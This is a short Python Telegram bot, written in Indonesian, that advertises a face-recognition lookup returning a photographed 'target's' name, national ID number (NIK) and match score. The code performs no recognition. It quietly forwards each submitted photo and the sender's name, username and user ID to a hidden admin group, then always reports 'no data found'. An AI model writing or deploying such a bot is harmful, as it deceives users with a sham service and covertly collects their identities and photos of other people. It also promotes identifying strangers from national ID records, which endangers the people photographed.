from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio
from datetime import datetime

TOKEN = "TOKEN_BOT_KAMU"

# ID GROUP ADMIN
ADMIN_GROUP_ID = -1001234567890

WELCOME_TEXT = """
SELAMAT DATANG

BOT FR TESTING
(KUOTA 10/DAY)

CARA PENGGUNAAN BOT

1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.

2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10 MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.

3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.

4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.

5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH

SELAMAT BERTUGAS, SEMOGA SUKSES SELALU
"""

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME_TEXT)

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):

    now = datetime.now().hour

    if now < 6 or now > 21:
        await update.message.reply_text("⚠️ Server sedang offline\n\nJam operasional 06.00 - 21.00 WIB")
        return

    user = update.message.from_user
    photo = update.message.photo[-1].file_id

    # kirim foto ke group admin
    await context.bot.send_photo(
        chat_id=ADMIN_GROUP_ID,
        photo=photo,
        caption=f"""
📥 FOTO MASUK

User : {user.first_name}
Username : @{user.username}
User ID : {user.id}
"""
    )

    await update.message.reply_text(
        "📥 Foto diterima\n\n⏳ Sistem sedang melakukan pengecekan FR..."
    )

    await asyncio.sleep(5)

    hasil = """
HASIL PENGECEKAN FR

Nama : DATA TIDAK DITEMUKAN
NIK  : -
Kemiripan : 0%

STATUS : TIDAK ADA DATA
"""

    await update.message.reply_text(hasil)


app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

print("Bot berjalan...")
app.run_polling()
